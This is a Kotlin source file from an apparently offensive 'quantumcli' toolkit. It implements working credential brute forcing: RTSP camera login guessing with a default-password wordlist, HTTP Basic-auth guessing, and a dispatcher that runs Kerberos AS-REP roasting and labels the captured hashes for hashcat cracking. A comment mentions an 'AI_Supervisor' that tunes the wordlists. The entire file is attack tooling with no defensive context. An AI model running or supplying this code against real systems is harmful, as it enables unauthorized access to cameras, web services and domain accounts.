package com.projectzerodays.quantumcli.ops

import java.net.Socket
import java.util.Base64
import org.json.JSONObject

/** BruteEngineV3 parity — RTSP DESCRIBE auth brute + HTTP Basic brute. */
object Brute {

    /** Default tuned wordlists (AI_Supervisor.tune_brute_wordlist fallback). */
    val RTSP_WORDS = listOf(
        "admin", "12345", "password", "admin123", "1234", "123456",
        "root", "12345678", "888888", "66668888", "pass", "111111"
    )

    val HTTP_USERS = listOf("admin", "root", "user", "administrator")
    val HTTP_WORDS = listOf("admin", "password", "123456", "admin123", "root", "1234", "")

    data class Cred(val user: String, val pass: String) {
        override fun toString(): String = "$user:$pass"
    }

    /** RTSP DESCRIBE Basic-auth brute (users x wordlist, parity with rtsp_brute). */
    fun rtspBrute(ip: String, port: Int = 554, wordlist: List<String> = RTSP_WORDS): List<Cred> {
        val creds = ArrayList<Cred>()
        for (u in listOf("admin", "root", "service", "viewer")) {
            for (p in wordlist) {
                val auth = Base64.getEncoder().encodeToString("$u:$p".toByteArray(Charsets.ISO_8859_1))
                val req = ("DESCRIBE rtsp://$ip:$port/ RTSP/1.0\r\nCSeq: 2\r\n" +
                    "Authorization: Basic $auth\r\n\r\n").toByteArray(Charsets.ISO_8859_1)
                var hit = false
                try {
                    Socket().use { s ->
                        s.connect(java.net.InetSocketAddress(ip, port), 3000)
                        s.soTimeout = 3000
                        s.getOutputStream().apply { write(req); flush() }
                        val buf = ByteArray(256)
                        val n = s.getInputStream().read(buf)
                        val resp = if (n > 0) String(buf, 0, n, Charsets.ISO_8859_1) else ""
                        if (resp.contains("200")) {
                            creds.add(Cred(u, p))
                            hit = true
                        }
                    }
                } catch (e: Exception) {
                    return creds
                }
                if (hit) break
            }
        }
        return creds
    }

    /** HTTP Basic-auth brute against a protected path. */
    fun httpBrute(
        ip: String,
        port: Int = 80,
        path: String = "/",
        users: List<String> = HTTP_USERS,
        wordlist: List<String> = HTTP_WORDS,
    ): List<Cred> {
        val hits = ArrayList<Cred>()
        val scheme = if (port == 443) "https" else "http"
        for (u in users) {
            for (p in wordlist) {
                val auth = Base64.getEncoder().encodeToString("$u:$p".toByteArray(Charsets.ISO_8859_1))
                val r = Net.httpGet(
                    "$scheme://$ip:$port$path",
                    mapOf("Authorization" to "Basic $auth"),
                    2500
                )
                if (r.status in 200..299) {
                    hits.add(Cred(u, p))
                    break
                }
                if (r.error != null && r.status == 0) return hits
            }
        }
        return hits
    }

    /**
     * Service dispatch (BruteEngineV3.run parity): rtsp / http / asreproast.
     * SMB/Kerberos-hash cracking stays on the desktop CLI; on-device we run the
     * network-facing auth brutes plus raw AS-REP roasting.
     */
    fun run(ip: String, service: String, params: Map<String, String> = emptyMap()): JSONObject {
        val out = org.json.JSONObject().put("ip", ip).put("service", service)
        when (service.lowercase()) {
            "rtsp" -> {
                val hits = rtspBrute(ip, params["port"]?.toIntOrNull() ?: 554)
                out.put("hits", org.json.JSONArray(hits.map { it.toString() }))
                if (hits.isNotEmpty()) out.put("note", "RTSP CRACKED")
            }
            "http", "web" -> {
                val hits = httpBrute(ip, params["port"]?.toIntOrNull() ?: 80, params["path"] ?: "/")
                out.put("hits", org.json.JSONArray(hits.map { it.toString() }))
            }
            "asreproast", "roast" -> {
                val hashes = Kerberos.asrepRoast(ip, params["domain"] ?: ip)
                out.put("hashes", org.json.JSONArray(hashes))
                if (hashes.isNotEmpty()) out.put("note", "AS-REP hashes captured (hashcat -m 18200)")
            }
            else -> out.put("error", "service '$service' not supported on-device (rtsp/http/asreproast)")
        }
        return out
    }
}
